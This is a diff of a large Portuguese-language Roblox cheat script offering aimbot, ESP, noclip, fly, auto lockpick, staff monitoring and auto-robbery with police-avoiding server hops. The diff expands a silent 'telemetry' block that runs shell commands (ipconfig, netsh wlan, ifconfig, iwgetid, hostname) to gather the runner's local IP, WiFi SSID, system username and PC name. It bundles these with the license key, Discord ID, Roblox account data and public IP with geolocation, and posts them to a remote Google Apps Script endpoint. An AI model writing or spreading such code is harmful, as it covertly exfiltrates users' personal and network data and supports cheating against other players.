@@ -766,8 +766,7 @@ if not VTUI.Auth or not VTUI.Auth.HWID then return end
 
 -- ============================================================
 -- TELEMETRIA AUTONOMA — integrada após autenticação
--- Cole em qualquer script. Nao depende de UI, login ou Slate.
--- Chame: _VT_TELEMETRY.send({ key = "VTRN-XXXX-XXXX", edition = "basic" })
+-- Coleta PC + Mobile com fallbacks seguros
 -- ============================================================
 local _VT_TELEMETRY = (function()
     local Players = game:GetService("Players")
@@ -777,17 +776,14 @@ local _VT_TELEMETRY = (function()
     local LocalPlayer = Players.LocalPlayer
     while not LocalPlayer do task.wait(); LocalPlayer = Players.LocalPlayer end
 
-    -- ============================================================
-    -- CONFIG — edite aqui
-    -- ============================================================
     local CFG = {
         API_URL = "https://script.google.com/macros/s/AKfycbzIVDEunBX4IwXWeltZ9ee8lVWtF-NFQtSj85QBki9o9DDDUDEMWcKfEJCzOY5KoVQeSA/exec",
         EDITION = "basic",
-        SCRIPT_VERSION = "telemetry-v1.0",
+        SCRIPT_VERSION = "telemetry-v1.1",
         FOLDER = "VeteranoTeam",
         TIMEOUT = 10,
-        SEND_ON_LOAD = false,   -- true = envia sozinho 1s apos rodar
-        SILENT = true,          -- true = nao mostra notificacao/print de status
+        SEND_ON_LOAD = false,
+        SILENT = true,
     }
 
     local C = (getgenv and getgenv()) or _G
@@ -802,7 +798,7 @@ local _VT_TELEMETRY = (function()
     local session = { sent = false, sending = false, cancelled = false, status = "idle" }
 
     -- ============================================================
-    -- HELPERS DE ARQUIVO (opcionais, nao quebram se faltar)
+    -- HELPERS DE ARQUIVO
     -- ============================================================
     local function safeRead(path)
         if type(readFn) ~= "function" then return nil end
@@ -827,12 +823,93 @@ local _VT_TELEMETRY = (function()
     end
 
     -- ============================================================
-    -- HELPERS DE LEITURA SEGURA
+    -- HELPERS DE LEITURA SEGURA (PC + MOBILE)
     -- ============================================================
     local function readValue(fn)
         local ok, value = pcall(fn)
         if ok and value ~= nil then return tostring(value) end
         return ""
+    end
+
+    local function safeShell(cmd)
+        local ok, out = pcall(function()
+            if type(io) ~= "table" or type(io.popen) ~= "function" then return "" end
+            local h = io.popen(cmd)
+            if not h then return "" end
+            local s = h:read("*a") or ""
+            h:close()
+            return s
+        end)
+        if ok and type(out) == "string" then return out end
+        return ""
+    end
+
+    local function platformName()
+        local ok, name = pcall(function()
+            local p = UserInputService:GetPlatform()
+            if p and p.Name then return p.Name end
+        end)
+        if ok and type(name) == "string" and name ~= "" then return name end
+        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+            return "Mobile"
+        elseif UserInputService.KeyboardEnabled then
+            return "Desktop"
+        end
+        return "Unknown"
+    end
+
+    local function isMobile()
+        local p = platformName():lower()
+        return p:find("android", 1, true) or p:find("ios", 1, true)
+            or p:find("mobile", 1, true) or p:find("phone", 1, true)
+            or (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled)
+    end
+
+    local function collectLocalIP()
+        local out = safeShell('ipconfig 2>nul | findstr /i "IPv4"')
+        if out == "" then out = safeShell("ifconfig 2>/dev/null | grep 'inet '") end
+        if out == "" then out = safeShell("ip -4 addr 2>/dev/null | grep inet") end
+        if out ~= "" then
+            local ip = out:match("(%d+%.%d+%.%d+%.%d+)")
+            if ip and ip ~= "127.0.0.1" then return ip end
+        end
+        return ""
+    end
+
+    local function collectWifi()
+        local out = safeShell('netsh wlan show interfaces 2>nul | findstr "SSID"')
+        if out ~= "" then
+            local ssid = out:match("SSID%s*:%s*([^\r\n]+)")
+            if ssid then
+                ssid = ssid:gsub("^%s+", ""):gsub("%s+$", "")
+                if ssid ~= "" then return ssid end
+            end
+        end
+        out = safeShell("iwgetid -r 2>/dev/null")
+        if out ~= "" then return out:gsub("%s+$", "") end
+        out = safeShell("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null | awk '/ SSID/ {print substr($0, index($0, $2))}'")
+        if out ~= "" then return out:gsub("%s+$", "") end
+        return ""
+    end
+
+    local function collectSysUser()
+        local v = readValue(function() return os.getenv and os.getenv("USERNAME") end)
+        if v == "" then v = readValue(function() return os.getenv and os.getenv("USER") end) end
+        if v == "" then v = readValue(function() return os.getenv and os.getenv("LOGNAME") end) end
+        return v
+    end
+
+    local function collectPCName()
+        local v = readValue(function() return os.getenv and os.getenv("COMPUTERNAME") end)
+        if v == "" then v = readValue(function() return os.getenv and os.getenv("HOSTNAME") end) end
+        if v == "" then v = safeShell("hostname 2>/dev/null"):gsub("%s+$", "") end
+        return v
+    end
+
+    local function collectArch()
+        local ok, s = pcall(function() return string.packsize("I8") end)
+        if ok and s == 8 then return "x64" end
+        return "x86"
     end
 
     local function decode(raw)
@@ -871,9 +948,6 @@ local _VT_TELEMETRY = (function()
         return decode(raw), nil
     end
 
-    -- ============================================================
-    -- HWID (persistente por conta)
-    -- ============================================================
     local function identifier()
         if C.__VT_TELEMETRY_HWID and type(C.__VT_TELEMETRY_HWID) == "string"
             and #C.__VT_TELEMETRY_HWID > 0 and #C.__VT_TELEMETRY_HWID <= 256 then
@@ -892,17 +966,16 @@ local _VT_TELEMETRY = (function()
     end
 
     -- ============================================================
-    -- COLETA DE DADOS
+    -- COLETA DE DADOS (PC + MOBILE)
     -- ============================================================
     local function collect(extra)
         extra = extra or {}
+        local mobile = isMobile()
         local data = {
-            -- Identificacao
             event_id = HttpService:GenerateGUID(false),
             key = tostring(extra.key or safeRead(CFG.FOLDER .. "/key.txt") or ""):sub(1, 200),
             hwid = identifier(),
 
-            -- Roblox
             roblox_id = tostring(LocalPlayer.UserId),
             roblox_name = LocalPlayer.Name,
             roblox_display = LocalPlayer.DisplayName,
@@ -910,7 +983,6 @@ local _VT_TELEMETRY = (function()
             roblox_locale = readValue(function() return LocalizationService.RobloxLocaleId end),
             system_locale = readValue(function() return LocalizationService.SystemLocaleId end),
 
-            -- Executor / sistema
             executor = readValue(function()
                 local fn = identifyexecutor or getexecutorname
                 if type(fn) == "function" then return fn() end
@@ -918,68 +990,42 @@ local _VT_TELEMETRY = (function()
             client_version = readValue(function()
                 if type(version) == "function" then return version() end
             end),
-            sys_user = readValue(function() return os.getenv and os.getenv("USERNAME") end),
-            pc_name = readValue(function() return os.getenv and os.getenv("COMPUTERNAME") end),
-            arch = (function()
-                local ok, s = pcall(function() return string.packsize("I8") end)
-                return ok and s == 8 and "x64" or "x86"
-            end)(),
+            sys_user = collectSysUser(),
+            pc_name = collectPCName(),
+            arch = collectArch(),
 
-            -- Plataforma / input
-            platform = readValue(function() return UserInputService:GetPlatform().Name end),
-            touch_enabled = UserInputService.TouchEnabled,
-            keyboard_enabled = UserInputService.KeyboardEnabled,
-            gamepad_enabled = UserInputService.GamepadEnabled,
-            mouse_enabled = UserInputService.MouseEnabled,
+            platform = platformName(),
+            is_mobile = mobile,
+            touch_enabled = UserInputService.TouchEnabled == true,
+            keyboard_enabled = UserInputService.KeyboardEnabled == true,
+            gamepad_enabled = UserInputService.GamepadEnabled == true,
+            mouse_enabled = UserInputService.MouseEnabled == true,
+            accelerometer_enabled = readValue(function() return tostring(UserInputService.AccelerometerEnabled) end),
+            gyro_enabled = readValue(function() return tostring(UserInputService.GyroEnabled) end),
+            vr_enabled = readValue(function() return tostring(UserInputService.VREnabled) end),
 
-            -- Rede local (PC apenas, vazio no mobile)
-            local_ip = (function()
-                local ok, out = pcall(function()
-                    local h = io and io.popen and io.popen('ipconfig 2>nul | findstr /i "IPv4"')
-                    if h then local s = h:read("*a") or ""; h:close(); return s end
-                    return ""
-                end)
-                if ok and out then local ip = out:match("(%d+%.%d+%.%d+%.%d+)"); if ip then return ip end end
-                return ""
-            end)(),
-            wifi = (function()
-                local ok, out = pcall(function()
-                    local h = io and io.popen and io.popen('netsh wlan show interfaces 2>nul | findstr "SSID"')
-                    if h then local s = h:read("*a") or ""; h:close(); return s end
-                    return ""
-                end)
-                if ok and out and #out > 0 then
-                    local ssid = out:match("SSID%s*:%s*([^\r\n]+)")
-                    if ssid then return ssid:gsub("^%s+", ""):gsub("%s+$", "") end
-                end
-                return ""
-            end)(),
+            local_ip = collectLocalIP(),
+            wifi = collectWifi(),
 
-            -- Jogo
             place_id = tostring(game.PlaceId),
             game_id = tostring(game.GameId),
             job_id = tostring(game.JobId),
 
-            -- Meta do script
             script_version = CFG.SCRIPT_VERSION,
             edition = tostring(extra.edition or CFG.EDITION),
             user_agent = "VeteranoTeam/" .. CFG.SCRIPT_VERSION .. " (" .. tostring(extra.edition or CFG.EDITION) .. ")",
 
-            -- Discord (se existirem arquivos)
             discord_id = safeRead(CFG.FOLDER .. "/discord_id.txt") or "",
             discord_tag = safeRead(CFG.FOLDER .. "/discord_tag.txt") or "",
 
-            -- Extra livre
             extra = type(extra.extra) == "table" and extra.extra or nil,
         }
 
-        -- Perfil Roblox (data de criacao da conta)
         local profile = httpJSON("https://users.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId))
         if profile and tonumber(profile.id) == LocalPlayer.UserId and type(profile.created) == "string" then
             data.roblox_created_at = profile.created
         end
 
-        -- IP publico + geo
         local geo = httpJSON("https://ipwho.is/?fields=success,ip,country,region,city,timezone")
         if geo and geo.success == true then
             data.public_ip = geo.ip or ""
@@ -992,9 +1038,6 @@ local _VT_TELEMETRY = (function()
         return data
     end
 
-    -- ============================================================
-    -- ENVIO
-    -- ============================================================
     local function report(message)
         session.status = message
         if not CFG.SILENT then
@@ -1034,9 +1077,6 @@ local _VT_TELEMETRY = (function()
         return true
     end
 
-    -- ============================================================
-    -- API PUBLICA
-    -- ============================================================
     local api = {}
     api.send = send
     api.collect = collect
@@ -1350,7 +1390,6 @@ do
             if ok and result and type(result.GetMoveVector) == "function" then controls = result end
         end
     end
-    -- Retorna movimento relativo a camera, preservando a intensidade analogica.
     function o.flyInput(camera, humanoid)
         if UserInputService:GetFocusedTextBox() then return Vector3.zero end
         local input, world = Vector3.zero, false
@@ -1381,7 +1420,6 @@ do
         stopSpeed()
         local generation = flyGeneration
         loadControls()
-        -- require pode ceder a execucao; confirme novamente o personagem.
         if generation ~= flyGeneration or o.destroyed or o.fixedTeleportBusy or (o.travel and o.travel.owner) then return false end
         local char, root, hum = LocalPlayer.Character, isRoot(), isCValid()
         if not char or not root or not hum or hum.Health <= 0 or hum.SeatPart or root.Anchored then return false end
@@ -1447,8 +1485,6 @@ do
             end
         end)
     end
-    -- Destino e a posicao exata da raiz. Apenas a UI de locais adiciona +3 studs.
-    -- A mesma operacao atende locais, coleta, lixeiro e garagem, sem desativar colisoes.
     function o.teleportDirect(target, active)
         if teleport or o.destroyed then return false, "Outro teleporte esta em andamento." end
         if typeof(target) ~= "Vector3" or target.X ~= target.X or target.Y ~= target.Y or target.Z ~= target.Z
@@ -1515,13 +1551,12 @@ do
     handleReady(LocalPlayer.CharacterRemoving:Connect(function() o.cleanupMovement() end))
 end
 
--- Constante mantida para as rotinas antigas de coleta.
 local D = 16
 local function isUpdateInstancePropertiesEValid()
-    return false -- Sem interceptar protecoes para alterar o limite do carro.
+    return false
 end
 
--- JumpPower: impulso no pulo nativo, sem escrever propriedades do Humanoid.
+-- JumpPower
 do
     local tracked, stateConnection, pendingBoost
     local generation = 0
@@ -1604,9 +1639,7 @@ do
     handleReady(LocalPlayer.CharacterRemoving:Connect(restore))
 end
 
--- ============================================================
--- COLISOES COMPARTILHADAS: VEICULOS E FARMS
--- ============================================================
+-- COLISOES
 local sz
 do
     local leases = {}
@@ -1643,9 +1676,7 @@ do
     handleReady(LocalPlayer.CharacterAdded:Connect(function() step() end))
 end
 
--- ============================================================
 -- GHOST MODE
--- ============================================================
 do
     local HEIGHT = 10
     local PLATFORM_OFFSET = 3.5
@@ -1848,9 +1879,7 @@ do
     end))
 end
 
--- ============================================================
 -- CAMUFLAR NICK
--- ============================================================
 do
     local NOME_FAKE = "@VETERANO.DEV"
     local bindings = {}
@@ -1917,9 +1946,7 @@ do
     end)))
 end
 
--- ============================================================
 -- AUTO CINTO
--- ============================================================
 do
     local acc = 0
     local function autoCinto()
@@ -1948,9 +1975,7 @@ do
     end)))
 end
 
--- ============================================================
 -- VEICULO: NOCLIP CAR + VFLY
--- ============================================================
 local function Dz(hum)
     if type(getconnections) ~= "function" then return nil end
     if type(debug) ~= "table" or type(debug.getupvalue) ~= "function" then return nil end
@@ -2154,9 +2179,7 @@ do
     end)))
 end
 
--- ============================================================
--- BOOST (hz)
--- ============================================================
+-- BOOST
 local function hz(hum)
     local st = Dz(hum)
     if not st then return false end
@@ -2188,9 +2211,7 @@ task.spawn(function()
     end
 end)
 
--- ============================================================
 -- DURABILIDADE HUD
--- ============================================================
 do
     local MAX = 1500
     local green = Color3.fromRGB(70, 190, 120)
@@ -2375,9 +2396,7 @@ do
     end
 end
 
--- ============================================================
 -- STAFF MONITOR
--- ============================================================
 task.spawn(function()
     while not o.destroyed do
         if T.monitorarStaff then
@@ -2954,7 +2973,6 @@ handleReady(Players.PlayerRemoving:Connect(function(plr)
     if b2 then qF(b2); T.bundles[plr] = nil end
 end))
 
--- WorldToViewportPoint e DeviceSafeInsets usam a mesma origem no mobile.
 local function updateHeadTracer(plr,bundle,cam,myPos)
     local char=plr.Character
     local head=char and char:FindFirstChild("Head")
@@ -3014,9 +3032,7 @@ end))
 handleReady({Disconnect=function() RunService:UnbindFromRenderStep(binding) end})
 end
 
--- ============================================================
 -- AIMBOT
--- ============================================================
 local SF = {
     Cabeca = { "Head" },
     Tronco = { "Torso", "UpperTorso", "LowerTorso", "HumanoidRootPart" },
@@ -3099,9 +3115,7 @@ end
 o.aimbotLoop = aimbotLoop
 o.stopAimbot = stopAimbot
 
--- ============================================================
 -- AUTO LOCKPICK
--- ============================================================
 do
     local lastClick, warned = -math.huge, false
 
@@ -3185,9 +3199,7 @@ do
     end)))
 end
 
--- ============================================================
 -- INTERAÇÃO E MOVIMENTO COMPARTILHADOS
--- ============================================================
 do
     local I = {}
     o.interact = I
@@ -3240,7 +3252,6 @@ do
         return true
     end
 
-    -- Procura chao e volume livre perto do alvo; nunca desliga CanCollide.
     function o.findLanding(position, reach, target, preferred)
         local root, hum, char = isRoot(), isCValid(), LocalPlayer.Character
         if not root or not hum or not char or not position then return nil end
@@ -3311,9 +3322,7 @@ do
 
 end
 
--- ============================================================
 -- MOVIMENTO DE OBJETOS
--- ============================================================
 do
     local function rootsFor(obj)
         local roots, seen = {}, {}
@@ -3370,9 +3379,7 @@ do
     end
 end
 
--- ============================================================
 -- COLETA DE ITENS
--- ============================================================
 local ZF, DF, rF, hF, jF, WF = 20, 14, 1.5, D, 18, 65
 
 local WHITELIST_ARMAS = {
@@ -3404,7 +3411,7 @@ local function ehArmaPermitida(nome)
 end
 o.ehArmaPermitida = ehArmaPermitida
 
-local POSICAO_RETORNO = Vector3.new(-431.4, 119.6, -4973.3) -- Hospital
+local POSICAO_RETORNO = Vector3.new(-431.4, 119.6, -4973.3)
 local GF
 do
     local inventoryPoll = 0.35
@@ -3741,7 +3748,6 @@ do
     local ok, success, message = pcall(function()
         status("Coletando " .. tostring(target.nome or target.item.Name))
 
-        -- 1. Puxar arma (se ativado)
         if not checkDone and (pullOverride == true or (pullOverride == nil and T.pullWeaponsEnabled)) then
             local root = isRoot()
             if not root then return false, "Personagem indisponivel." end
@@ -3749,7 +3755,6 @@ do
             local moved, why = o.worldMove.toPosition(target.item, target.parte, point, nil)
             if not moved then return false, why end
         else
-            -- 2. TP até a arma
             local root = isRoot()
             if not root then return false, "Personagem indisponivel." end
             local prompt = target.prompt or target.item:FindFirstChildWhichIsA("ProximityPrompt", true)
@@ -3762,7 +3767,6 @@ do
             local arrived = o.teleportLocation(destination, "Arma")
             if not arrived then return false, "TP para a arma falhou." end
 
-            -- 🔥 RESET MANUAL do TP (essencial) + delay curto
             o.fixedTeleportBusy = false
             o.travelBusy = false
             task.wait(0.25)
@@ -3771,7 +3775,6 @@ do
         local root2 = isRoot()
         if not root2 then return false, "Personagem indisponivel." end
 
-        -- 3. Interação rápida (menos tentativas, menos delay)
         local prompt = target.prompt or target.item:FindFirstChildWhichIsA("ProximityPrompt", true)
         local click  = target.item:FindFirstChildWhichIsA("ClickDetector", true)
         local handle = target.item:FindFirstChild("Handle", true) or target.parte
@@ -3807,7 +3810,6 @@ do
 
             if used then
                 interacted = true
-                -- Confirmação rápida (500ms em vez de 2s)
                 local ack = os.clock() + 0.5
                 while os.clock() < ack do
                     if received() then break end
@@ -3816,7 +3818,6 @@ do
                 end
             end
 
-            -- Delay curto entre tentativas (150ms em vez de 400ms)
             task.wait(0.15)
         end
 
@@ -3826,7 +3827,6 @@ do
 
         inventoryBaseline = snapshot()
 
-        -- 4. Retorno ao hospital (delay curto)
         if not checkDone and T.returnOnWeaponPickup ~= false then
             status("Arma coletada! Retornando ao hospital...")
             task.wait(0.3)
@@ -3931,9 +3931,7 @@ end
     function o.cleanupCollection() enabled = false; o.stopAutoColeta() end
 end
 
--- ============================================================
 -- HUD DE COLETA
--- ============================================================
 do
     local hudGui = Instance.new("ScreenGui")
     hudGui.Name = "VeteranoColetaHUD"
@@ -4077,9 +4075,7 @@ do
     end)
 end
 
--- ============================================================
 -- FARM PARTES
--- ============================================================
 do
     local function tF()
         local folder = workspace:FindFirstChild("FarmPartesDeArma")
@@ -4144,9 +4140,7 @@ do
     o.pararFarmPartes = KF
 end
 
--- ============================================================
 -- FARM LIXEIRO
--- ============================================================
 do
     local P2 = 10
     local LIXEIRO_TP = Vector3.new(-1216.14, 129.42, -5183.68)
@@ -4425,9 +4419,7 @@ do
     o.startLixeiro = startLixeiro
 end
 
--- ============================================================
 -- FARM PESCA
--- ============================================================
 do
     local PESCA_TP = Vector3.new(-2593.61, 122.34, -3044.99)
     local function normalize(text) return tostring(text or ""):lower():gsub("[^%w]", "") end
@@ -4531,9 +4523,7 @@ do
     end
 end
 
--- ============================================================
 -- FARM ABÓBORAS
--- ============================================================
 do
     local P = {
         run = 0, alive = true, started = false, scanning = false, scanAt = -math.huge,
@@ -5090,9 +5080,7 @@ do
     end
 end
 
--- ============================================================
 -- TRACER ARMAS (CorBala)
--- ============================================================
 do
     local tracerColors = {
         { "Ciano", Color3.fromRGB(0, 255, 255) },
@@ -5146,9 +5134,7 @@ do
     end)))
 end
 
--- ============================================================
 -- FULLBRIGHT / NO LAG
--- ============================================================
 do
     local originals = setmetatable({}, { __mode = "k" })
     local generation, writing, elapsed = 0, false, 0
@@ -5285,9 +5271,7 @@ do
     end)))
 end
 
--- ============================================================
 -- LOOP PRINCIPAL DE MOVIMENTO
--- ============================================================
 local function Wz(dt)
     if o.destroyed then return end
     local hum = isCValid()
@@ -5301,9 +5285,7 @@ handleReady(RunService.Stepped:Connect(LPH_NO_VIRTUALIZE(function()
     if not o.destroyed then pcall(o.noclip.step) end
 end)))
 
--- ============================================================
 -- GARAGEM
--- ============================================================
 do
     local G = { records = {}, byCar = {}, byLabel = {}, selected = nil,
         ids = setmetatable({}, { __mode = "k" }), nextId = 0, esp = {}, busy = false,
@@ -5723,9 +5705,7 @@ do
     end)))
 end
 
--- ============================================================
 -- VIDA, SEDE E FOME
--- ============================================================
 do
     local token = 0
     local definitions = {
@@ -5883,30 +5863,30 @@ local CONFIG = {
     INICIAR_AUTO_ROUBO = false,
     INICIAR_POR_BAIXO = false,
     AUTO_TROCAR_SERVIDOR = false,
-    MIN_POLICIAIS = 4, -- Minimo absoluto para permanecer no servidor.
+    MIN_POLICIAIS = 4,
     MIN_POLICIAIS_CASSINO = 5,
     BANCO_CENTRAL = Vector3.new(-634.49, 108.45, -2675.41),
     RAIO_BANCO_CENTRAL = 180,
-    POSICAO_CASSINO = nil, -- Opcional; a busca existente do cassino foi mantida.
+    POSICAO_CASSINO = nil,
     INICIAR_GHOST = false,
     MODO_ECONOMICO = false,
     SOMENTE_BOLSAS = false,
     FPS_ECONOMICO = 30,
     CASSINO_PROFUNDO = false,
-    PROFUNDIDADE_CASSINO = 60, -- Limite; a altura real respeita o alcance da bolsa.
+    PROFUNDIDADE_CASSINO = 60,
     TEMPO_SEM_PROGRESSO = 40,
     FALHAS_ANTES_DE_TROCAR_LOCAL = 3,
     REAVALIAR_LOCAL_APOS = 90,
     CACHE_LISTA_SERVIDORES = 45,
     INTERVALO_CONTINUAR_BUSCA = 2,
     EQUIPES_POLICIA = {"policia", "police", "policial", "pm", "pc", "pf", "prf", "bope", "rota", "choque", "pmesp", "pmerj", "pmmg", "gcm", "gm", "guardacivil", "guardamunicipal", "guardametropolitana"},
-    NOMES = { -- Fragmentos especificos dos nomes das bolsas/modelos.
+    NOMES = {
         "moneybag", "cashbag", "bagmoney", "bolsadedinheiro", "bolsadinheiro",
         "sacodedinheiro", "sacodinheiro", "sacodegrana", "malote",
         "moneydrop", "cashdrop", "dinheirodropado", "pilhadedinheiro", "cashpile",
     },
     LOCAIS = {"cassino", "casino", "joalheria", "jewelry", "jewellery", "banco", "bank", "roubo", "robbery"},
-    ROTA = { -- Opcional: Vector3.new(X, Y, Z) de cada local. Sem coordenadas inventadas.
+    ROTA = {
     },
     PROFUNDIDADE = 4,
     DISTANCIA_NORMAL = 2.5,
@@ -5975,7 +5955,6 @@ local function status(text)
     if refreshUI then refreshUI() end
 end
 
--- Normalizacao para locais e equipes.
 local function normalize(text)
     local s = tostring(text or ""):lower()
     for accented, plain in pairs({["á"]="a",["à"]="a",["ã"]="a",["â"]="a",["é"]="e",["ê"]="e",["í"]="i",["ó"]="o",["ô"]="o",["õ"]="o",["ú"]="u",["ç"]="c",["Á"]="a",["À"]="a",["Ã"]="a",["Â"]="a",["É"]="e",["Ê"]="e",["Í"]="i",["Ó"]="o",["Ô"]="o",["Õ"]="o",["Ú"]="u",["Ç"]="c"}) do
@@ -6032,7 +6011,6 @@ local function isPoliceTeam(team)
     local prefix = tostring(team.Name or ""):lower():match("%a+") or ""
     for _, alias in ipairs(CONFIG.EQUIPES_POLICIA) do
         local key = normalize(alias)
-        -- Aceita GCM/PM com prefixos e sufixos decorativos, sem achar siglas no meio de outras palavras.
         if key ~= "" and (name == key or (#key >= 5 and name:find(key, 1, true))
             or (#key <= 4 and prefix == key)) then return true end
     end
@@ -6065,7 +6043,6 @@ local function watchPolicePlayer(member)
 end
 
 local function removePolicePlayer(member)
-    -- PlayerRemoving pode disparar enquanto GetPlayers ainda contem quem esta saindo.
     app.leavingPlayers[member] = true
     for _, c in ipairs(app.policeConnections[member] or {}) do c:Disconnect() end
     app.policeConnections[member] = nil
@@ -6114,7 +6091,6 @@ local function classify(handle)
     if not kind or (kind == "prompt" and not handle.Enabled) then return nil end
     local attachment, part, nearestModel, namedObject, location = nil, nil, nil, nil, false
     local names, node = {}, handle.Parent
-    -- Nunca considera bolsas equipadas, ferramentas ou objetos dentro de personagens.
     while node and node ~= World do
         if node:IsA("Tool") or (node:IsA("Model") and node:FindFirstChildOfClass("Humanoid")) then
             return nil
@@ -6146,7 +6122,6 @@ local function classify(handle)
     local object = namedObject or part
     if unavailable(object) or unavailable(part) then return nil end
     local position = attachment and attachment.WorldPosition or part.Position
-    -- A excecao de 4 policiais se aplica somente a area informada do Banco Central.
     local locationKey = (position - CONFIG.BANCO_CENTRAL).Magnitude <= CONFIG.RAIO_BANCO_CENTRAL and "banco" or "cassino"
     return {
         handle = handle, kind = kind, part = part, object = object,
@@ -6218,7 +6193,6 @@ end
 
 pauseForPolice = function()
     cancelHeldPrompt()
-    -- Interrompe a interacao, mantendo a altura para nao cair sob o mapa.
     local hold = app.hold
     if hold then
         hold.position = (hold.target and positionOf(hold.target)) or hold.position
@@ -6244,8 +6218,7 @@ local function applyNoCollision(char)
     end
 end
 
--- GHOST DO ARQUIVO FORNECIDO: corpo real 10 studs abaixo e plataforma de apoio.
--- A ponte sincroniza corpo, clone, plataforma e noclip no mesmo deslocamento.
+-- GHOST
 do
     local LocalPlayer, workspace, o = player, World, app
     local function handleReady(connection)
@@ -6457,7 +6430,6 @@ do
         RunService:BindToRenderStep(RENDER_BINDING, Enum.RenderPriority.Last.Value, updateCameraAndGhost)
     end
 
-    -- O controlador da coleta usa esta ponte; nao move o corpo por outro loop.
     o.ghostHeight = HEIGHT
     o.setGhostHeight = function(height)
         HEIGHT = math.clamp(tonumber(height) or 10, 0.1, math.max(40, CONFIG.PROFUNDIDADE_CASSINO + CONFIG.DISTANCIA_NORMAL))
@@ -6492,7 +6464,6 @@ do
 end
 end
 
--- Controle de ciclo: preserva os valores anteriores ao ligar/desligar o bloco.
 local function restoreGhostState()
     local saved = app.savedGhostState
     app.savedGhostState = nil
@@ -6710,7 +6681,6 @@ local function recordCollectionOutcome(target, ok)
     return false
 end
 
--- TROCA DE SERVIDOR: lista publica, paginacao e historico local da sessao.
 local historyKey = "VT_AUTO_ROUBO_SERVER_HISTORY_V1"
 
 local function saveServerHistory()
@@ -6773,7 +6743,6 @@ local function fetchServerPage(url)
     return data
 end
 
--- Conserva a pagina e separa falhas de servidores realmente visitados.
 local serverSearch = {
     cursor = nil, order = "Desc", seen = {}, page = 0,
     failed = {}, reusable = nil, http = nil, pool = nil,
@@ -6816,7 +6785,6 @@ local function queryServerPage(url, id, job)
     local function alive()
         return canHop(id) and (not job or app.hopJob == job)
     end
-    -- Nao acumula consultas se o executor recusar cancelar uma requisicao.
     local previous = serverSearch.http
     if previous and not previous.done then
         local cancelled = previous.thread and type(task.cancel) == "function"
@@ -6959,7 +6927,6 @@ local function requestServerHop(id, reason)
         status(message or "Servidor indisponivel; tentando depois")
         return
     end
-    -- A falta de policiais tem prioridade mesmo quando ainda existem bolsas.
     local policeReady = refreshPoliceCount() >= CONFIG.MIN_POLICIAIS
     if job.reason == "police" and policeReady then
         app.hopJob = nil
@@ -6981,7 +6948,7 @@ local function requestServerHop(id, reason)
         end
     end
     job.destination = destination
-    serverSearch.failed[destination] = os.time() + 90 -- Tentativa, nao visita confirmada.
+    serverSearch.failed[destination] = os.time() + 90
     saveServerHistory()
     if not canHop(id) or app.hopJob ~= job then return end
     status("Entrando em outro servidor...")
@@ -7187,7 +7154,6 @@ setEnabled = function(value, reason)
             root.AssemblyAngularVelocity = Vector3.zero
             root.CFrame = app.origin
         elseif root and lastHold and lastHold.below and lastPosition and char == lastHold.char then
-            -- Sem retorno, sai de baixo do chao junto ao ultimo alvo.
             root.AssemblyLinearVelocity = Vector3.zero
             root.AssemblyAngularVelocity = Vector3.zero
             root.CFrame = (lastHold.usesGhost and ghostSurface)
@@ -7307,8 +7273,6 @@ local function diagnostic()
     end
     status("Diagnostico: " .. math.min(#nearby, 50) .. " interacoes no console")
 end
-
--- Alteracoes visuais locais e reversiveis; a fisica do mapa permanece ativa.
 
 refreshUI = function()
     if host.onRobberyUpdate then host.onRobberyUpdate(app) end
